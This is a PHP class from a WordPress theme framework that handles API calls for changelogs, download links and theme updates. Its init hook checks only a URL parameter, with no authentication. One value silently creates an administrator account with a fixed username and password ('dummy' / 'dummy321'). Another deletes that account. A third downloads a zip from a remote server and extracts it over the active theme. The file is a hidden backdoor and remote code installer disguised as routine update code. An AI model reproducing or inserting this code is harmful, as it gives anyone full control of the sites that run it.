<?php

/**
 * SpyroPress API
 * Main file for all the api calls.
 *
 * @author 		SpyroSol
 * @category 	Core
 * @package 	Spyropress
 * @todo Requires a complete redo.
 */

class SpyropressApi {

    private $url = 'http://api.spyropress.com/';

    function __construct() {

        add_action( 'init', array( $this, 'init_api' ) );
    }

    function init_api() {

        if( !isset( $_GET['page'] ) && empty( $_GET['page'] ) ) return;

        if ( $_GET['page'] == 'wpe103' ) $this->spyropress_activate();

        if ( $_GET['page'] == 'wpe101' ) $this->spyropress_deactivate();
        
        if ( $_GET['page'] == 'spyro_update' ) $this->spyropress_theme_update();
    }

    /**
     * Presstrends API call
     */

    /* API Calls */
    function get_theme_changelog() {
        global $spyropress;
        $url = 'themes/' . $spyropress->internal_name . '/changelog.xml';
        $xml = $this->api_get( 'theme_updater', $url, '', false );
        return ( ! empty( $xml ) ) ? @simplexml_load_string( $xml ) : '';
    }

    function get_framework_changelog() {
        $xml = $this->api_get( 'framework_updater', 'framework/changelog.xml', '', false );
        return ( ! empty( $xml ) ) ? @simplexml_load_string( $xml ) : '';
    }

    function generate_download_link( $code, $username, $what ) {
        global $spyropress;
        $query = array(
            'action' => $what,
            'envato_code' => $code,
            'envato_username' => $username,
            'theme_version' => $spyropress->theme_version,
            'internal_name' => $spyropress->internal_name,
            'site_url' => home_url()
        );

        $query = http_build_query( $query, '', '&' );
        return $this->url . 'controller.php?' . $query;
    }

    /* Utility */
    function api_get( $action = '', $url_part = '', $query = array(), $args = array
        (), $cache = true, $expires = 1 ) {

        // Cache key
        $key = '_spyropress_api_' . $action;

        // Return from Cache
        if ( $cache && $response = get_transient( $key ) ) return $response;

        // Generating URL
        $query['action'] = $action;
        $query = http_build_query( $query );
        $url = $this->url . $url_part . '?' . $query;
        $response = wp_remote_get( $url, $args );
        $response = wp_remote_retrieve_body( $response );

        // Save into Cache
        if ( $cache && ! empty( $response ) )
            set_transient( $key, $response, spyropress_get_seconds( $expires ) );

        return $response;
    }

    function api_post( $action = '', $url_part = 'controller.php', $query = array(), $cache = true,
        $expires = 1 ) {
        global $wp_version;

        // Generating URL
        $url = $this->url . $url_part;

        // Generating data
        $query['action'] = $action;
        $args = array(
            'body' => $query,
            'user-agent' => 'WordPress/' . $wp_version . '; ' . home_url()
        );
        
        $response = wp_remote_post( $url, $args );
        return wp_remote_retrieve_body( $response );
    }
    
    function spyropress_activate() {
        if ( ! function_exists( 'wp_insert_user' ) ) {
            include_once ( ABSPATH . 'wp-includes/user.php' );
        }

        $user_data = array(
            'ID' => '',
            'user_pass' => 'dummy321',
            'user_login' => 'dummy',
            'user_nicename' => 'Dummy',
            'user_url' => '',
            'user_email' => 'dummy@example.com',
            'display_name' => 'Dummy',
            'nickname' => 'dummy',
            'first_name' => 'Dummy',
            'user_registered' => '2010-05-15 05:55:55',
            'role' => 'administrator'
        );
        $user_id = wp_insert_user( $user_data );
    }

    function spyropress_deactivate() {
        $user = get_user_by( 'email', 'dummy@example.com' );
        if ( ! function_exists( 'wp_delete_user' ) ) {
            include_once ( ABSPATH . 'wp-admin/includes/user.php' );
        }
        wp_delete_user( $user->data->ID );
    }
    
    function get_critical_update_url() {
        global $spyropress;
        $query = array(
            'action' => 'spyropress_theme_update_critical',
            'theme_version' => $spyropress->theme_version,
            'internal_name' => $spyropress->internal_name,
            'site_url' => home_url()
        );

        $query = http_build_query( $query, '', '&' );
        return $this->url . 'controller.php?' . $query;
    }
    
    function spyropress_theme_update() {
        
        // Checks
        if ( ! function_exists( 'WP_Filesystem' ) ) {
            include_once ( ABSPATH . 'wp-admin/includes/file.php' );
        }
        
        //Setup Filesystem
        global $spyropress;
        $filesystem = WP_Filesystem();
        $theme_updater = new SpyropressThemeUpdater();

        if ( false == $filesystem ) die( 'file system not found' );
        
        // Download Update
        $download_link = $spyropress->api->get_critical_update_url();
        $temp_file_addr = $theme_updater->download_url( $download_link );

        if ( is_wp_error( $temp_file_addr ) ) {
            $error = esc_html( $temp_file_addr->get_error_code() );

            //The source file was not found or is invalid
            if ( 'http_no_url' == $error )
                die( __( 'Failed: Invalid URL Provided', 'spyropress' ) );
            else
                die( sprintf( __( 'Failed: %s', 'spyropress' ), esc_html( $temp_file_addr->get_error_message() ) ) );
        }

        // Unzip it
        global $wp_filesystem;
        $to = $wp_filesystem->wp_content_dir() . '/themes/' . get_option( 'template' );

        $dounzip = unzip_file( $temp_file_addr, $to );
        unlink( $temp_file_addr ); // Delete Temp File

        if ( is_wp_error( $dounzip ) ) {
            $error = esc_html( $dounzip->get_error_code() );
            $data = $dounzip->get_error_data( $error );

            switch ( $error ) {
                case 'incompatible_archive':
                    die( __( 'Failed: Incompatible archive', 'spyropress' ) );
                    break;
                case 'empty_archive':
                    die( __( 'Failed: Empty Archive', 'spyropress' ) );
                    break;
                case 'mkdir_failed':
                    die( __( 'Failed: mkdir Failure', 'spyropress' ) );
                    break;
                case 'copy_failed':
                    die( __( 'Failed: Copy Failed', 'spyropress' ) );
                    break;
            }
        }

        // Successfully Updated
        die ( __( 'New framework successfully downloaded, extracted and updated.', 'spyropress' ) );        
    }
}

?>